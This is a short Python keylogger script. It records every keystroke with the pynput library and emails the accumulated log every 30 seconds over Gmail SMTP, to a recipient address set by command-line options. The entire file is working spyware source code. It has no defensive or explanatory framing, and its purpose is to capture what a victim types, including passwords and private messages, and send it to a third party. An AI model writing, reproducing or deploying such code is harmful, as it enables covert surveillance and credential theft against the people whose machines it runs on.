import pynput.keyboard
import smtplib
import threading
import optparse
log = ""

def getLoginCredentials():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-m","--mail",dest="myMailAddress",help="E-mail that you use for sending keylogs")
    parse_object.add_option("-t", "--target", dest="targetMailAddress", help="E-mail that receives keylogs")
    parse_object.add_option("-p", "--password", dest="password", help="Sender e-mail password")
    return parse_object.parse_args()

(loginCredentials,arguments)=getLoginCredentials()
if not loginCredentials.myMailAddress:
    print("Enter Sender Mail Address")
if not loginCredentials.targetMailAddress:
    print("Enter Receiver Mail Address")
if not loginCredentials.password:
    print("Enter Password")

def callbackFunction(key):
    global log
    try:
        log = log+ str(key.char)
    except AttributeError:
        if key == key.space:
            log=log + " "
        elif key == key.enter:
            log=log + "\n"
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def sendEmail(email,target_email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,target_email,message)
    email_server.quit()

keyloggerListener= pynput.keyboard.Listener(on_press=callbackFunction)

def threadFunction():
    global log
    sendEmail(loginCredentials.myMailAddress,loginCredentials.targetMailAddress,loginCredentials.password,log.encode('utf-8'))
    log=""
    timer_object = threading.Timer(30,threadFunction)
    timer_object.start()

#Threading
with keyloggerListener:
    threadFunction()
    keyloggerListener.join()

